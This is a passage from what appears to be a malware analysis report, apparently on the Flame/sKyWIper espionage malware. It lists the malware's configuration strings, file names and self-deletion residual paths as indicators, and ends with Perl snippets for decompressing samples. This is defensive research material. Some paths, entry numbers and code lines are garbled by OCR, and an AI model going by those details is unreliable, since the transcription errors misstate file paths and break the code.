ExposureIndicating.78 ~dfc855.tmp ExposureIndicating.79 SeCEdit ExposureIndicating.80 DefaultEnvironment ExposureIndicating.81 LastUsedIdentifier ExposureIndicating.82 Windows Authentication Client Manager ExposureIndicating.83 Windows NT Enhanced Processing Service ExposureIndicating.84 ~rcf0 ExposureIndicating.85 ~rci0 ExposureIndicating.86 ~ZLM0D1.ocx ~ZLM0D2.ocx ExposureIndicating.87 ExposureIndicating.88 Delayed Write Failed ExposureIndicating.89 iexplore ExposureIndicating.90 cgi-bin\counter.cgi ExposureIndicating.91 Mon.com ExposureIndicating.92 Mon . exe ExposureIndicating.93 ~ekz167.tmp ExposureIndicating.94 ~zwp129.tmp ExposureIndicating.95 ~dfc634.tmp ExposureIndicating.96 ~dfc551.tmp ExposureIndicating.97 ~dfc412.tmp ExposureIndicating.98 tftp.exe ExposureIndicating.99 csvde.exe ExposureIndicating.100 dstrlog.dat ExposureIndicating.101 dstrlogh.dat ExposureIndicating.102 ~ZFF ExposureIndicating.103 ~ZLM ExposureIndicating.104 ~PCY ExposureIndicating.105 Firefox\profiles ExposureIndicating.106 advnetcfg ExposureIndicating.107 hub001.dat ExposureIndicating.108 hub002.dat ExposureIndicating.109 .MSBTS ExposureIndicating.110 D:\.. ExposureIndicating.111 E: \ . . ExposureIndicating.112 F:\.. G:\.. ExposureIndicating.113 ExposureIndicating.114 H: \ . . ExposureIndicating.115 watchxb.sys ExposureIndicating.116 ntaps.dat ExposureIndicating.117 netcfgi.ocx ExposureIndicating.118 advpck.dat¶ ExposureIndicating.119 Advanced Network Configuration ExposureIndicating.120 commgr32.dll ExposureIndicating.121 comspol32.dll ExposureIndicating.122 ~rf288.tmp ExposureIndicating.123 msglu32.ocx ExposureIndicating.124 Windows Indexing Service ExposureIndicating.125 Remote Procedure Call Namespace Client ExposureIndicating.126 rpcnc.dat ExposureIndicating.127 sndmix.drv ExposureIndicating.128 fmpidx.bin ExposureIndicating.129 tokencpt ExposureIndicating.130 Windows Client Manager ExposureIndicating.131 secindex

![](_page_59_Picture_1.jpeg)

| ExposureIndicating.132 | mixercfg.dat |
|------------------------|--------------|
| ExposureIndicating.133 | audtable.dat |
| ExposureIndicating.134 | mixerdef.dat |
| ExposureIndicating.135 | MSSndMix     |
| ExposureIndicating.136 | MSAuthCtrl   |
| ExposureIndicating.137 | authpack.ocx |
| ExposureIndicating.138 | posttab.bin  |
| ExposureIndicating.139 | lrlogic      |
| ExposureIndicating.140 | lmcache.dat  |
| ExposureIndicating.141 | ctrllist.dat |
| ExposureIndicating.142 | authcfg.dat  |
| ExposureIndicating.143 | dcomm        |
| ExposureIndicating.144 | dmmsapi      |

Figure 53 – List of the malware's configuration settings – most likely contains the malware's own files

Possible other related parts from different sources:

| SUICIDE.RESIDUAL FILES.A [NoValue]->%temp%\~a28.tmp                   |  |
|-----------------------------------------------------------------------|--|
| SUICIDE.RESIDUAL FILES.B [NoValue]->%temp%\~DFL542.tmp                |  |
| SUICIDE.RESIDUAL FILES.C [NoValue]->%temp%\~DFL543.tmp                |  |
| SUICIDE.RESIDUAL FILES.D [NoValue]->%temp%\~DFL544.tmp                |  |
| SUICIDE.RESIDUAL FILES.E [NoValue]->%temp%\~DFL545.tmp                |  |
| SUICIDE.RESIDUAL FILES.F [NoValue]->%temp%\~DFL546.tmp                |  |
| SUICIDE.RESIDUAL FILES.G [NoValue]->%temp%\~dra51.tmp                 |  |
| SUICIDE.RESIDUAL FILES.H [NoValue]->%temp%\~dra52.tmp                 |  |
| SUICIDE.RESIDUAL FILES.I [NoValue]->%temp%\~fghz.tmp                  |  |
| SUICIDE.RESIDUAL FILES.J [NoValue]->%temp%\~rei524.tmp                |  |
| SUICIDE.RESIDUAL FILES.K [NoValue]->%temp%\~rei525.tmp                |  |
| SUICIDE.RESIDUAL FILES.L [NoValue]->%temp%\~TFFL848.tmp               |  |
| SUICIDE.RESIDUAL FILES.M [NoValue]->%temp%\~TFFL842.tmp               |  |
| SUICIDE.RESIDUAL FILES.O [NoValue]->%temp%\GRb2M2.bat                 |  |
| SUICIDE.RESIDUAL FILES.P [NoValue]->%temp%\indsvc32.ocx               |  |
| SUICIDE.RESIDUAL FILES.Q [NoValue]->%temp%\scaud32.exe                |  |
| SUICIDE.RESIDUAL FILES.R [NoValue]->%temp%\scsec32.exe                |  |
| SUICIDE.RESIDUAL FILES.S [NoValue]->%temp%\sdclt32.exe                |  |
| SUICIDE.RESIDUAL FILES.T [NoValue]->%temp%\sstab.dat                  |  |
| SUICIDE.RESIDUAL FILES.U [NoValue]->%temp%\sstab15.dat                |  |
| SUICIDE.RESIDUAL FILES.V [NoValue]->%temp%\winrt32.dll                |  |
| SUICIDE.RESIDUAL FILES.W [NoValue]->%temp%\winrt32.ocx                |  |
| SUICIDE.RESIDUAL FILES.X [NoValue]->%temp%\wpab32.bat                 |  |
| SUICIDE.RESIDUAL FILES.T [NoValue]->&windir%\system32\commgr32.dll    |  |
| SUICIDE.RESIDUAL FILES.A1 [NoValue]->&windir%\system32\comspol32.dll  |  |
| SUICIDE.RESIDUAL FILES.A2 [NoValue]->&windir%\system32\comspol32.ocx  |  |
| SUICIDE.RESIDUAL FILES.A3 [NoValue]->&windir%\system32\indsvc32.dll   |  |
| SUICIDE.RESIDUAL FILES.A4 [NoValue]->&windir%\system32\indsvc32.ocx   |  |
| SUICIDE.RESIDUAL FILES.A5 [NoValue]->&windir%\system32\modevga.com    |  |
| SUICIDE.RESIDUAL FILES.A6 [NoValue]->%windir%\system32\mssui.drv      |  |
| SUICIDE.RESIDUAL FILES.A7 [NoValue]->&windir%\system32\scaud32.exe    |  |
| SUICIDE.RESIDUAL FILES.A8 [NoValue]->&windir%\system32\sdclt32.exe    |  |
| SUICIDE.RESIDUAL FILES.A2 [NoValue]->%windir%\system32\watchxb.sys    |  |
| SUICIDE.RESIDUAL FILES.A10 [NoValue]->%windir%\system32\winconf32.ocx |  |
| SUICIDE.RESIDUAL FILES.A11 [NoValue]->%windir%\system32\mssvc32.ocx   |  |

![](_page_60_Picture_4.jpeg)

SUICIDE.RESIDUAL FILES.A12 [NoValue]->%COMMONPROGRAMFILES%\Microsoft Shared\MSSecurityMgr\rccache.dat SUICIDE.RESIDUAL FILES.A13 [NoValue]->%COMMONPROGRAMFILES%\Microsoft Shared\MSSecurityMgr\dstrlog.dat SUICIDE.RESIDUAL FILES.A14 [NoValue]->%COMMONPROGRAMFILES%\Microsoft Shared\MSAudio\dstrlog.dat SUICIDE.RESIDUAL\_FILES.A15 [NoValue]->%COMMONPROGRAMFILES%\Microsoft Shared\MSSecurityMgr\dstrlogh.dat SUICIDE.RESIDUAL FILES.A16 [NoValue]->%COMMONPROGRAMFILES%\Microsoft Shared\MSAudio\dstrlogh.dat SUICIDE.RESIDUAL FILES.A17 [NoValue]->%SYSTEMROOT%\Temp\~8C5FF6C.tmp SUICIDE.RESIDUAL\_FILES.A18 [NoValue]->%windir%\system32\sstab0.dat SUICIDE.RESIDUAL\_FILES.A12 [NoValue]->%windir%\system32\sstab1.dat SUICIDE.RESIDUAL FILES.A20 [NoValue]->%windir%\system32\sstab2.dat SUICIDE.RESIDUAL\_FILES.A21 [NoValue]->%windir%\system32\sstab3.dat SUICIDE.RESIDUAL FILES.A22 [NoValue]->%windir%\system32\sstab4.dat SUICIDE.RESIDUAL FILES.A23 [NoValue]->%windir%\system32\sstab5.dat SUICIDE.RESIDUAL\_FILES.A24 [NoValue]->&windir%\system32\sstab6.dat SUICIDE.RESIDUAL FILES.A25 [NoValue]->&windir%\system32\sstab7.dat SUICIDE.RESIDUAL FILES.A26 [NoValue]->%windir%\system32\sstab8.dat SUICIDE.RESIDUAL FILES.A27 [NoValue]->%windir%\system32\sstab2.dat SUICIDE.RESIDUAL FILES.A28 [NoValue]->%windir%\system32\sstab10.dat SUICIDE.RESIDUAL FILES.A22 [NoValue]->%windir%\system32\sstab.dat SUICIDE.RESIDUAL\_FILES.B1 [NoValue]->%temp%\~HLV751.tmp SUICIDE.RESIDUAL FILES.B2 [NoValue]->%temp%\~KWI288.tmp SUICIDE.RESIDUAL\_FILES.B3 [NoValue]->%temp%\~KWI282.tmp SUICIDE.RESIDUAL FILES.B4 [NoValue]->%temp%\~HLV084.tmp SUICIDE.RESIDUAL FILES.B5 [NoValue]->%temp%\~HLV224.tmp SUICIDE.RESIDUAL FILES.B6 [NoValue]->%temp%\~HLV227.tmp SUICIDE.RESIDUAL FILES.B7 [NoValue]->%temp%\~HLV473.tmp SUICIDE.RESIDUAL FILES.B8 [NoValue]->%windir%\system32\nteps32.ocx SUICIDE.RESIDUAL FILES.B2 [NoValue]->%windir%\system32\advnetcfg.ocx SUICIDE.RESIDUAL FILES.B10 [NoValue]->%windir%\system32\ccalc32.sys SUICIDE.RESIDUAL FILES.B11 [NoValue]->%windir%\system32\boot32drv.sys SUICIDE.RESIDUAL\_FILES.B12 [NoValue]->%windir%\system32\rpcnc.dat SUICIDE.RESIDUAL FILES.B13 [NoValue]->%windir%\system32\soapr32.ocx SUICIDE.RESIDUAL\_FILES.B14 [NoValue]->%windir%\system32\ntaps.dat SUICIDE.RESIDUAL FILES.B15 [NoValue]->%windir%\system32\advpck.dat SUICIDE.RESIDUAL FILES.B16 [NoValue]->%temp%\~rf288.tmp SUICIDE.RESIDUAL\_FILES.B17 [NoValue]->%temp%\~dra53.tmp SUICIDE.RESIDUAL\_FILES.B18 [NoValue]->%systemroot%\system32\msglu32.ocx SUICIDE.RESIDUAL FILES.C1 [NoValue]->%COMMONPROGRAMFILES%\Microsoft Shared\MSAuthCtrl\authcfg.dat SUICIDE.RESIDUAL FILES.C2 [NoValue]->%COMMONPROGRAMFILES%\Microsoft Shared\MSSndMix\mixercfg.dat

Figure 54 – SUICIDE RESIDUAL FILES – probably also malware related (to691.tmp)

![](_page_61_Picture_2.jpeg)

#### Possible other related parts from different sources:

```
&windir%\system32\comspo132.dll↑ ? DisableRSO - found in res146 in F
compression; maybe the same as nteps32
%windir%\system32\commgr32.dll↑ ? DisableRTA - The same as for
comspo132.dll
```
![](_page_62_Figure_2.jpeg)

![](_page_62_Picture_3.jpeg)

### ANNEX

Here we give some hint on implementing functions for which we had problems. The typical example is encryption, where it is very important which parameters and implementation are in use, and what type of header should exist for the successful decompression.

Again, we don't want to show best practice, we want to show at least one successful way to work with the sample.

```
… load sample into $bufall
use Compress::Zlib;
sub FlatDecoding {
my ($str) = @ ;
my @ret = split('', $str);
my ($k, $err) = inflateInit( {-Bufsize => 1});
my ($ret,$z,$status) = ('','','',0);
foreach (@ret) {
($z, $status) = $k->inflate($ );
$ret .= $z;
last if $status == Z STREAM END or $status != Z OK;
}
return $ret;
}
$bufall2=FlatDecoding($bufall);
..save $bufall2
```
Figure 56 - F/Inflate/Flate decompression - PERL sample code copied from the net

```
… load sample into $bufall
use Compress::PPMd;
my $decoder=Compress::PPMd::Decoder->new();
  my $bufall2=$decoder->decode(substr($bufall,4));
 not be decompressed
..save $bufall2
```
![](_page_63_Figure_6.jpeg)

![](_page_63_Picture_7.jpeg)